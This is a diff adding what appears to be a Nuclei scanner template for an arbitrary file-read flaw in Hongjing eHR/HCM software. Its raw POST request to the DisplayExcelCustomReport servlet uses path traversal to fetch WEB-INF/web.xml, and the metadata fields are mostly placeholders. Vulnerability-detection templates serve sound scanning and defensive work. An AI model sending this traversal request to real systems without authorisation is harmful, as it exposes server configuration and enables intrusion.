@@ -1,0 +1,23 @@
+id: hongjing-DisplayExcelCustomReport-fileread
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 宏景ehr-hcm-DisplayExcelCustomReport-文件读取
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /templates/attestation/../../servlet/DisplayExcelCustomReport HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 40
+
+        filename=../webapps/ROOT/WEB-INF/web.xml
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml'
